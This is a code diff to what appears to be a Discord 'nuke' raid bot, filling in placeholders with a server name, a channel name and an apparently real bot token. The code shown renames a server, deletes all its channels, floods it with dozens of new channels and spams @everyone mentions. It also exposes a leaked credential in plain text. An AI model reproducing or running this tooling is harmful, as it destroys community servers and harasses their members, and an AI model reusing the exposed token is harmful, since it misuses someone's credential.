@@ -29,7 +29,7 @@ async def invite(ctx):
 @client.command()
 async def nuke(ctx):
 
-    await ctx.guild.edit(name='SERVER NAME') #Decide what to change the server name to
+    await ctx.guild.edit(name='kita') #Decide what to change the server name to
 
     for c in ctx.guild.channels:
         await c.delete()
@@ -38,7 +38,7 @@ async def nuke(ctx):
 
     n=0
     while(n<=85):
-        await guild.create_text_channel('CHANNEL NAME HERE') # Decide what should be the name of the text channels that you will create
+        await guild.create_text_channel('nuke') # Decide what should be the name of the text channels that you will create
         n = n+1
 
     for c in ctx.guild.text_channels:
@@ -57,4 +57,4 @@ async def spam(ctx):
              await c.send('@everyone ')
              await c.send('@everyone ')
 
-client.run('YOUR TOKEN HERE')
+client.run('ODU4NDM1NzUxMTcxNzE5MTg4.YNeGmA.Ru766BHSb5Z2ykGp_jzei1edqQg')
